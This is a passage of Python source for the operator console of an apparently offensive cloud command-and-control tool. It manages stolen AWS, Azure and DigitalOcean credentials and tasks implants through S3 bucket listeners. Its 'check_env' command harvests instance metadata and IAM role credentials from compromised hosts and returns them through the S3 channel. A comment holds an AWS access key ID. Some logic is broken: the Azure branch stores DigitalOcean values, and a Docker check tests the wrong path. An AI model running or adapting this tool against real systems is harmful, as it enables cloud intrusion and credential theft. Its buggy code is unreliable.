                    print(colored("[*] Please select a particle using: 'use particle <particle name>'", "red"))
                else:

                    shellchekc = 0
                    for particlename in particles:
                        if particlename['particle_key_name'] == particle:
                            for listenerlist in listeners:
                                if listenerlist['listener_bucket_name'] == particlename['particle_listener_name']:
                                    listenerargs = {
                                        "service_name": "s3",
                                        "region_name": listenerlist['listener_region'],
                                        "aws_access_key_id": listenerlist['listener_access_key'],
                                        "aws_secret_access_key": listenerlist['listener_secret_key']
                                    }
                                    try:
                                        s3profile = boto3.client(
                                            **listenerargs
                                        )

                                        command = command.replace("shell ", "").strip()
                                        if command == "check_env":
                                            command = 'bash -c \'echo "Instance User: $(whoami)";echo "Instance Hostname: $(hostname)";echo "Instance IP Info: $(ip a)";if [ "$(ps 1 | grep -v "PID" | cut -d "/" -f 3)" != "init" ];  then echo "Is Docker: True";  apt update > /dev/null && apt install fdisk curl iproute2 -y > /dev/null;  echo "Privileged Container: $(bash -c "ip link add dummy0 type dummy > /dev/null; if [ $? -eq 0 ]; then echo "True"; else echo "False"; fi")";  echo "Docker Sock Mounted: $(if [ -f /var/www/html ]; then echo "True"; else echo "False"; fi)";fi;if [ $(curl -I http://169.254.169.254/latest/meta-data/ --connect-timeout 10 | grep "HTTP" | cut -d " " -f 2) == "200" ]; then  echo "Instance Meta-Data V1 Enabled: True";  echo "InstanceId: $(curl http://169.254.169.254/latest/meta-data/instance-id)";  echo "Instance Public IP: $(curl http://169.254.169.254/latest/meta-data/public-ipv4)";  echo "Instance Private IP: $(curl http://169.254.169.254/latest/meta-data/local-ipv4)";  echo "Instance VPC ID: $(curl http://169.254.169.254/latest/meta-data/instance-id)";  if [ $(curl http://169.254.169.254/latest/meta-data/iam -I | grep "HTTP" | cut -d " " -f 2) == "200" ]; then    profilename=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials);    echo "Instance Profile Name: $profilename";    echo "Instance Profile Creds: $(curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$profilename")";  fi;elif [ $(curl -I http://169.254.169.254/latest/meta-data/ --connect-timeout 10 | grep "HTTP" | cut -d " " -f 2) == "401" ]; then  echo "Instance Meta-Data V1 Enabled: False";  echo "Instance Meta-Data V2 Enabled: True";  echo "InstanceId: $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id)";  echo "Instance Public IP: $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/public-ipv4)";  echo "Instance Private IP: $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/local-ipv4)";  echo "Instance VPC ID: $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id)";  if [ $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam" -I | grep "HTTP" | cut -d " " -f 2) == "200" ]; then    profilename=$(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials);    echo "Instance Profile Name: $profilename";    echo "Instance Profile Creds: $(TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`; curl -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$profilename")";  fi;fi;\''

                                        getsendcommand(
                                            bucket_name=listenerlist['listener_bucket_name'],
                                            particle_name=particle,
                                            command_key=listenerlist['listener_command_file'],
                                            output_key=listenerlist['listener_output_file'],
                                            command=command.replace("shell ", "").strip(),
                                            s3Client=s3profile,
                                            kmskeyid=listenerlist['listener_kms_key_arn'],
                                            particles=particles
                                        )
                                        del listenerlist
                                        del listenerargs
                                        shellchekc = 1
                                    except Exception as e:
                                        shellchekc = 1
                                        print(
                                            colored(
                                                f"[*] Error connecting to client: {str(e)}", "red"
                                            )
                                        )
                    if shellchekc == 0:
                        print(colored("[*] Particle does not exist", "red"))

            elif command.split(" ")[0] == 'remove':
                if command.split(" ")[1] == 'user':
                    if len(command.split(" ")) < 3:
                        print(colored("[*] Usage: 'remove user <username>'", "red"))

                    else:
                        user_json = {
                            "cosmonaut_name": command.split(" ")[2]
                        }

                        user_created = json.loads(requests.delete("{}/api/latest/cosmonauts".format(apihost),
                                                                json=user_json,
                                                                headers={"Authorization": "Bearer {}".format(jwt_token)}
                                                            ).text)

                        if not "error" in user_created:
                            print(colored("[*] User '{}' Deleted.".format(command.split(" ")[2]), "green"))
                        else:
                            print(colored("[*] {}".format(user_created['error']), "red"))

                elif command.split(" ")[1] == 'credentials':
                    if len(command.split(" ")) < 3:
                        print(colored("[*] Usage: 'remove credentials <username>'", "red"))

                    else:
                        for credential in all_sessions:
                            if credential['profile'] == command.split(" ")[2]:
                                if credential['provider'] == "AWS":
                                    cred_json = {
                                        "aws_profile_name": command.split(" ")[2]
                                    }

                                    cred_deleted = json.loads(requests.delete("{}/api/latest/awscredentials".format(apihost),
                                                                            json=cred_json,
                                                                            headers={"Authorization": "Bearer {}".format(jwt_token)}
                                                                        ).text)

                                    if not "error" in cred_deleted:
                                        print(colored("[*] Credential '{}' Deleted.".format(command.split(" ")[2]), "green"))
                                        del (all_sessions[all_sessions.index(credential)])
                                        del(comms['use']['credentials'][command.split(" ")[2]])
                                        del(comms['remove']['credentials'][command.split(" ")[2]])
                                    else:
                                        print(colored("[*] {}".format(cred_deleted['error']), "red"))

                                if credential['provider'] == "AZURE":
                                    cred_json = {
                                        "azurecredentials_name": command.split(" ")[2]
                                    }

                                    cred_deleted = json.loads(requests.delete("{}/api/latest/azurecredentials".format(apihost),
                                                                            json=cred_json,
                                                                            headers={"Authorization": "Bearer {}".format(jwt_token)}
                                                                        ).text)

                                    if not "error" in cred_deleted:
                                        print(colored("[*] Credential '{}' Deleted.".format(command.split(" ")[2]), "green"))
                                        del (all_sessions[all_sessions.index(credential)])
                                        del (comms['use']['credentials'][command.split(" ")[2]])
                                        del (comms['remove']['credentials'][command.split(" ")[2]])
                                    else:
                                        print(colored("[*] {}".format(cred_deleted['error']), "red"))

                                if credential['provider'] == "DIGITALOCEAN":
                                    cred_json = {
                                        "digitalocean_profile_name": command.split(" ")[2]
                                    }

                                    cred_deleted = json.loads(requests.delete("{}/api/latest/digitaloceancredentials".format(apihost),
                                                                            json=cred_json,
                                                                            headers={"Authorization": "Bearer {}".format(jwt_token)}
                                                                        ).text)

                                    if not "error" in cred_deleted:
                                        print(colored("[*] Credential '{}' Deleted.".format(command.split(" ")[2]), "green"))
                                        del (all_sessions[all_sessions.index(credential)])
                                        del (comms['use']['credentials'][command.split(" ")[2]])
                                        del (comms['remove']['credentials'][command.split(" ")[2]])
                                    else:
                                        print(colored("[*] {}".format(cred_deleted['error']), "red"))


            elif command.split(" ")[0] == 'create':
                if command.split(" ")[1] == 'user':
                    if len(command.split(" ")) < 3:
                        print(colored("[*] Usage: 'create user <username>'", "red"))

                    else:
                        user_passwod = getpass("Password: ").replace("\n", "").strip()
                        if user_passwod == "":
                            print(colored("[*] Password can't be empty", "red"))

                        else:
                            user_json = {
                                "cosmonaut_name": command.split(" ")[2],
                                "cosmonaut_pass": user_passwod
                            }
                            user_created = json.loads(requests.put("{}/api/latest/cosmonauts".format(apihost),
                                                                   json=user_json,
                                                           headers={"Authorization": "Bearer {}".format(jwt_token)}).text)

                            if not "error" in user_created:
                                print(colored("[*] User '{}' Created.".format(command.split(" ")[2]), "green"))
                            else:
                                print(colored("[*] {}".format(user_created['error']), "red"))

            elif command == 'unset':
                print(colored("Option 'unset' is used with another option. Use help for more.", "red"))

            elif command.split(" ")[0] == 'unset':
                if module_char == "":
                    print(colored("[*] Choose a module first.", "red"))

                elif len(command.split(" ")) < 2:
                    print(colored("[*] The right form is: set <OPTION> <VALUE>", "red"))

                elif (command.split(" ")[1]).upper() == 'SERVICE':
                    print(colored("[*] You can't change service.", "red"))

                else:
                    count = 1
                    for key, value in module_options['module_options'].items():
                        argument = ((command.split(" ")[1]).upper()).strip()
                        if key == argument:
                            count = 0
                            module_options['module_options'][key]['value'] = ""
                            break

                    if count == 1:
                        print(colored("[*] That option does not exist on this module", "red"))

            elif command == 'set':
                print(colored("Option 'set' is used with another option. Use help for more.", "red"))

            elif command.split(" ")[0] == 'set':
                if command.split(" ")[1] == 'default-regions':
                    if len(command.split(" ")) < 3:
                        print(colored("[*] Set one or several regions split by comma. Usage: 'set default-regions <region-name>,<region-name2>,etc'", "red"))
                    else:
                        if (command.split(" ")[2]).lower() == 'all':
                            regions = AWS_REGIONS
                        else:
                            regions = (command.split(" ")[2]).split(",")

                elif command.split(" ")[1] == 'user-agent':
                    if command.split(" ")[2] == 'windows':
                        useragent = random.choice(user_agents_windows)

                    elif command.split(" ")[2] == 'linux':
                        useragent = random.choice(user_agents_linux)

                    elif command.split(" ")[2] == 'custom':
                        useragent = input("User-Agent>>> ")
                    print(colored(f"[*] User Agent Set to: {useragent}", "green"))

                elif command.split(" ")[1] == 'web-proxy-certificate':
                    if len(command.split(" ")) < 4:
                        print(colored("[*] The format of the command is: set web-proxy-certificate <proxy> <cert path>\n"
                                      "eg: set web-proxy-certificate http://domain.tld:8080 /tmp/cert.pem\n", "red"))
                    else:
                        print()

                elif command.split(" ")[1] == 'web-proxy':
                    if len(command.split(" ")) < 4:
                        print(colored("[*] The format of the command is: set web-proxies <http/https> <proxy url>\n"
                                      "eg: set web-proxy http http://domain.tld:8080\n"
                                      "eg: set web-proxy http http://1.2.3.4:8080", "red"))
                    elif command.split(" ")[2] == 'http':
                        webproxyInput = (command.split(" ")[3]).strip().replace("\n", "")
                        #webproxyInput = input(colored("Enter HTTP Web Proxy URL (eg: http://1.1.1.1:8080): ", "yellow"))

                        proxyURLRegex = "(http):\/\/[a-zA-Z0-9@:%._\+~#=]{2,256}\:[0-9]{1,5}"
                        proxyIPRegex = "(http):\/\/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,5}"

                        while not re.match(proxyURLRegex, webproxyInput) and not re.match(proxyIPRegex, webproxyInput):
                            print(colored("[*] Web Proxy should have the format: http://<domain>.<tld>:<port>, eg http://domain.tld:8080 or http://<ip>:<port>, eg: http://1.1.1.1:8080", "red"))
                            webproxyInput = input(
                                colored("Enter HTTP Web Proxy URL (eg: http://1.1.1.1:8080): ", "yellow")).strip().replace("\n", "")

                        web_proxies.append(
                            {webproxyInput.strip().replace("\n", ""): ""}
                        )
                        print(colored("[*] HTTP Proxy added successfully", "green"))

                    elif command.split(" ")[2] == 'https':
                        webproxyInput = (command.split(" ")[3]).strip().replace("\n", "")
                        #webproxyInput = input(colored("Enter HTTP Web Proxy URL (eg: http://1.1.1.1:8080): ", "yellow"))

                        proxyURLRegex = "(https):\/\/[a-zA-Z0-9@:%._\+~#=]{2,256}\:[0-9]{1,5}"
                        proxyIPRegex = "(https):\/\/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,5}"

                        while not re.match(proxyURLRegex, webproxyInput) and not re.match(proxyIPRegex, webproxyInput):
                            print(colored("[*] Web Proxy should have the format: https://<domain>.<tld>:<port>, eg https://domain.tld:8080 or https://<ip>:<port>, eg: https://1.1.1.1:8080", "red"))
                            webproxyInput = input(
                                colored("Enter HTTPS Web Proxy URL (eg: https://1.1.1.1:8080): ", "yellow")).strip().replace("\n", "")

                        certpath = input("Certificate Path: ")

                        try:
                            with open(certpath, "rb") as proxy_cert:
                                HTTP_PROXY_CERT = base64.b64encode(proxy_cert.read()).decode()

                                web_proxies.append(
                                    {webproxyInput.strip().replace("\n", ""): HTTP_PROXY_CERT}
                                )
                                print(colored("[*] HTTPS Proxy added successfully", "green"))

                        except KeyError:
                            print(f"[*] {colored('Proxy not found', 'red')}")
                        except FileNotFoundError:
                            print(f"[*] {colored('Certificate File not found', 'red')}")
                        except Exception as e:
                            print(f"[*] {colored(str(e), 'red')}")

                elif command.split(" ")[1] == 'azure-credentials':
                    if len(command.split(" ")) < 3:
                        print(colored("[*] Usage: 'set credentials <username>'", "red"))
                    else:
                        yon = input("Are you putting an Access Token? [y/N] ")
                        if yon == "y" or yon == "Y":
                            yon = 'N'
                            access_token = input("Access Token: ")
                            refresh_token = input("Refresh Token: ")
                            tenant_id = input("Tenant ID: ")

                            cred_json = {
                                "azure_creds_name": command.split(" ")[2],
                                "azure_access_token": access_token,
                                "azure_refresh_token": refresh_token,
                                "azure_tenant_id": tenant_id
                            }

                        yon = input("Are credential Service Principal Credentials? [y/N] ")
                        if yon == "y" or yon == "Y":
                            tenant_id = input("Tenant ID: ")
                            client_id = input("Client ID: ")
                            yon = input("Are you using Client Secret? [y/N] ")
                            if yon == "y" or yon == "Y":
                                client_secret = input("Client Secret: ")
                                cred_json = {
                                    "azure_creds_name": command.split(" ")[2],
                                    "azure_client_id": client_id,
                                    "azure_client_secret": client_secret,
                                    "azure_tenant_id": tenant_id

                                }
                            else:
                                client_cert = input("Client Certificate")
                                cred_json = {
                                    "azure_creds_name": command.split(" ")[2],
                                    "azure_client_id": client_id,
                                    "azure_client_cert": client_cert,
                                    "azure_tenant_id": tenant_id
                                }

                        else:
                            email = input("User Email: ")
                            password = input("User Password: ")
                            tenant_id = input("Tenant ID: ")

                            cred_json = {
                                "azure_creds_name": command.split(" ")[2],
                                "azure_tenant_id": tenant_id,
                                "azure_user_principal_name": email,
                                "azure_password": password
                            }

                        cred_created = json.loads(requests.put("{}/api/latest/azurecredentials".format(apihost),
                                                                  json=cred_json,
                                                                  headers={"Authorization": "Bearer {}".format(jwt_token)}
                                                                  ).text)

                        if not "error" in cred_created:
                            print(colored("[*] Credential '{}' Created.".format(command.split(" ")[2]), "green"))
                            curr_creds = {
                                'provider': "AZURE",
                                'profile': "",
                                'access_key_id': "",
                                'secret_key': "",
                                'region': ""
                            }
                            curr_creds['provider'] = 'DIGITALOCEAN'
                            curr_creds['profile'] = set_digitalocean_creds_body["digitalocean_profile_name"]
                            curr_creds['access_key_id'] = set_digitalocean_creds_body["digitalocean_access_key"]
                            curr_creds['secret_key'] = set_digitalocean_creds_body["digitalocean_secret_key"]
                            curr_creds['region'] = set_digitalocean_creds_body["digitalocean_region"]

                            print(colored("[*] Credentials set. Use ", "green") + colored("'show credentials' ",
                                                                                          "blue") + colored(
                                "to check them.", "green"))

                            print(colored("[*] Currect credential profile set to ", "green") + colored(
                                "'{}'.".format(cred_prof), "blue") + colored("Use ", "green") + colored(
                                "'show current-creds' ", "blue") + colored("to check them.", "green"))


                        else:
                            print(colored("[*] {}".format(cred_created['error']), "red"))

                        del cred_json
                elif command.split(" ")[1] == 'do-credentials':
                    set_digitalocean_creds_body = {}
                    if len(command.split(" ")) == 2:
                        print(colored("[*] The right command is: set do-credentials <profile name>", "red"))
                    else:
                        yon = input("Are credential Space S3 Credentials? [y/N] ")
                        print(yon)
                        #if yon.replace("\n", "") == "" or yon.replace("\n", "") == None:
                        #    continue
                        if yon.replace("\n", "") == 'y' or yon.replace("\n", "") == 'Y':
                            access_key_id = input("Access Key ID: ")
                            secret_key = input("Secret Key ID: ")
                            region = input("Region: ")

                            sess_test['provider'] = 'DIGITALOCEAN'
                            sess_test['profile'] = str(command.split(" ")[2])
                            sess_test['access_key_id'] = str(access_key_id)
                            sess_test['secret_key'] = str(secret_key)
                            sess_test['region'] = region

                            set_digitalocean_creds_body = {
                                "digitalocean_profile_name": sess_test['profile'],
                                "digitalocean_access_key": sess_test['access_key_id'],
                                "digitalocean_secret_key": sess_test['secret_key'],
                                "digitalocean_region": region
                            }

                            aws_test = json.loads(requests.post("{}/api/latest/digitaloceancredentials".format(apihost),
                                                                headers={
                                                                    "Authorization": "Bearer {}".format(jwt_token)},
                                                                json={
                                                                    "digitalocean_profile_name": sess_test['profile']
                                                                }
                            ).text)

                            if not "error" in aws_test:
                                print(colored("[*] Credentials exist. Use another profile name!", "red"))

                            else:
                                cred_prof = sess_test['profile']
                                all_sessions.append(sess_test)

                                set_creds = json.loads(requests.put("{}/api/latest/digitaloceancredentials".format(apihost),
                                                                    headers={
                                                                        "Authorization": "Bearer {}".format(jwt_token)},
                                                                    json=set_digitalocean_creds_body).text)

                                if "error" in set_creds:
                                    print(colored("[*] {}".format(set_creds['error']), "red"))

                                else:
                                    curr_creds = {
                                        'provider': "",
                                        'profile': "",
                                        'access_key_id': "",
                                        'secret_key': "",
                                        'region': ""
                                    }
                                    curr_creds['provider'] = 'DIGITALOCEAN'
                                    curr_creds['profile'] = set_digitalocean_creds_body["digitalocean_profile_name"]
                                    curr_creds['access_key_id'] = set_digitalocean_creds_body["digitalocean_access_key"]
                                    curr_creds['secret_key'] = set_digitalocean_creds_body["digitalocean_secret_key"]
                                    curr_creds['region'] = set_digitalocean_creds_body["digitalocean_region"]

                                    print(colored("[*] Credentials set. Use ", "green") + colored("'show credentials' ",
                                                    "blue") + colored("to check them.", "green"))

                                    print(colored("[*] Currect credential profile set to ", "green") + colored(
                                        "'{}'.".format(cred_prof), "blue") + colored("Use ", "green") + colored(
                                        "'show current-creds' ", "blue") + colored("to check them.", "green"))

                        else:
                            digitalocean_token = input("DigitalOcean Token: ")

                            cred_prof = str(command.split(" ")[2])
                            set_digitalocean_creds_body['digitalocean_profile_name'] = cred_prof
                            set_digitalocean_creds_body['digitalocean_token'] = digitalocean_token

                            set_creds = json.loads(requests.put("{}/api/latest/digitaloceancredentials".format(apihost),
                                                                headers={
                                                                    "Authorization": "Bearer {}".format(jwt_token)
                                                                },
                                                                json=set_digitalocean_creds_body).text)

                            if "error" in set_creds:
                                print(colored("[*] {}".format(set_creds['error']), "red"))

                            else:
                                sess_test['profile'] = str(command.split(" ")[2])
                                sess_test['digitalocean_token'] = set_digitalocean_creds_body['digitalocean_token']
                                sess_test['provider'] = 'DIGITALOCEAN'
                                all_sessions.append(sess_test)

                                curr_creds = {
                                    'provider': "",
                                    'profile': "",
                                    'digitalocean_token': ""
                                }

                                curr_creds['provider'] = 'DIGITALOCEAN'
                                curr_creds['profile'] = set_digitalocean_creds_body["digitalocean_profile_name"]
                                curr_creds['digitalocean_token'] = set_digitalocean_creds_body["digitalocean_token"]

                                print(colored("[*] Credentials set. Use ", "green") + colored("'show credentials' ",
                                                                                              "blue") + colored(
                                    "to check them.", "green"))
                                print(colored("[*] Currect credential profile set to ", "green") + colored(
                                    "'{}'.".format(cred_prof), "blue") + colored("Use ", "green") + colored(
                                    "'show current-creds' ", "blue") + colored("to check them.", "green"))

                elif command.split(" ")[1] == 'aws-region':
                    if len(command.split(" ")) < 3:
                        print(colored(
                            "[*] The command is: set aws-region <region-name> or set aws-region all", "red"
                        ))
                    else:
                        regions = [command.split(" ")[2]]

                        if command.split(" ")[2] in AWS_REGIONS:
                            regions = [command.split(" ")[2]]

                        elif command.split(" ")[2] == "all":
                            regions = AWS_REGIONS

                        else:
                            print(colored(
                                "[*] The command is: set aws-region <region-name> or set aws-region all", "red"
                            ))

                elif command.split(" ")[1] == 'aws-credentials':
                    if len(command.split(" ")) == 2:
                        print(colored("[*] The right command is: set aws-credentials <profile name>", "red"))
                    elif len(command.split(" ")) > 2:
                        access_key_id = input("Access Key ID: ")

                        # AKIA4MTWLERB3KP6LC66
                        while not re.match("AKIA[A-Z0-9]{16}", access_key_id) and not re.match("ASIA[A-Z0-9]{16}", access_key_id):
                            access_key_id = input("Access Key ID: ")

                        secret_key = input("Secret Key ID: ")
                        while not re.match("[A-Z0-9a-z+/]{40}", secret_key):
                            secret_key = input("Secret Key ID: ")

                        region = input("Region: ")
                        while not region in AWS_REGIONS:
                            region = input("Region: ")

                        sess_test['provider'] = "AWS"
                        sess_test['profile'] = str(command.split(" ")[2])
                        sess_test['access_key_id'] = str(access_key_id)
                        sess_test['secret_key'] = str(secret_key)
                        sess_test['region'] = region
                        yon = input("\nDo you also have a session token?[y/N] ")
                        set_aws_creds_body = {
                            "aws_profile_name": sess_test['profile'],
                            "aws_access_key": sess_test['access_key_id'],
                            "aws_secret_key": sess_test['secret_key'],
                            "aws_region": region
                        }

                        if yon == 'y' or yon == 'Y':
                            sess_token = input("Session Token: ")
                            sess_test['session_token'] = sess_token
                            set_aws_creds_body["aws_session_token"] = sess_token

                        comms['use']['credentials'][command.split(" ")[2]] = None
                        comms['remove']['credentials'][command.split(" ")[2]] = None

                        if sess_test['profile'] == "" and sess_test['access_key_id'] == "" and sess_test['secret_key'] == "" and sess_test['region'] == "":
                            pass

                        else:
                            aws_test = json.loads(requests.post("{}/api/latest/awscredentials".format(apihost),
                                         headers={"Authorization": "Bearer {}".format(jwt_token)},
                                         json={"aws_profile_name": sess_test['profile']}).text)

                            if not "error" in aws_test:
                                print(colored("[*] Credentials exist. Use another profile name!", "red"))

                            else:
                                cred_prof = sess_test['profile']
                                all_sessions.append(sess_test)

                                set_creds = json.loads(requests.put("{}/api/latest/awscredentials".format(apihost),
                                                       headers={"Authorization": "Bearer {}".format(jwt_token)},
                                                       json=set_aws_creds_body).text)

                                if "error" in set_creds:
                                    print(colored("[*] {}".format(set_creds['error']), "red"))

                                else:
                                    curr_creds = {
                                        'provider': "",
                                        'profile': "",
                                        'access_key_id': "",
                                        'secret_key': "",
                                        'region': ""
                                    }
                                    curr_creds['provider'] = "AWS"
                                    curr_creds['profile'] = set_aws_creds_body["aws_profile_name"]
                                    curr_creds['access_key_id'] = set_aws_creds_body["aws_access_key"]
                                    curr_creds['secret_key'] = set_aws_creds_body["aws_secret_key"]
                                    curr_creds['region'] = set_aws_creds_body["aws_region"]

                                    if 'aws_session_token' in set_aws_creds_body:
                                        curr_creds['session_token'] = set_aws_creds_body["aws_session_token"]

                                    print(colored("[*] Credentials set. Use ", "green") + colored("'show credentials' ",
                                                    "blue") + colored("to check them.", "green"))
                                    print(colored("[*] Currect credential profile set to ", "green") + colored(
                                        "'{}'.".format(cred_prof), "blue") + colored("Use ", "green") + colored(
                                        "'show current-creds' ", "blue") + colored("to check them.", "green"))

                else:
                    if module_char == "":
                        print(colored("[*] Choose a module first.","red"))

                    elif len(command.split(" ")) < 3:
                        print (colored("[*] The right form is: set <OPTION> <VALUE>","red"))

                    elif (command.split(" ")[1]).upper() == 'SERVICE':
                        print(colored("[*] You can't change service.", "red"))

                    else:
                        count = 1
                        for key, value in module_options['module_options'].items():
                            argument = ((command.split(" ")[1]).upper()).strip()
                            if key == argument:
                                count = 0
                                module_options['module_options'][key]['value'] = command.split(" ")[2]
                                break

                        if count == 1:
                            print(colored("[*] That option does not exist on this module","red"))

            else:
                try:
                    if system == 'Windows':
                        command = "powershell.exe " + command
                        out = os.popen(command).read()
                        print(out)
                    elif system == 'Linux' or system == 'Darwin':
                        out = os.popen(command).read()
                        print(out)
                except Exception as e:
                    print(colored("[*] '{}' is not a valid command.".format(command), "red"))

            #com = "({})({})({}) >>> ".format(colored(workspace, "green"), colored(particle, "red"), colored(terminal, "blue"))
            com = "({})({})({}) >>> ".format(colored(cur_creds_name, "green"), colored(particle, "red"), colored(terminal, "blue"))
            command = session.prompt(
                ANSI(com),
                completer=completer,
                complete_style=CompleteStyle.READLINE_LIKE
            )
    except KeyboardInterrupt:
        command = input(
            colored("Are you sure you want to exit? [y/N] ", "red")
        )
        if command == "Y" or command == "y":
            exit()

        main(workspace, particle, module_char)


if __name__ == '__main__':
    main(workspace, particle, module_char)
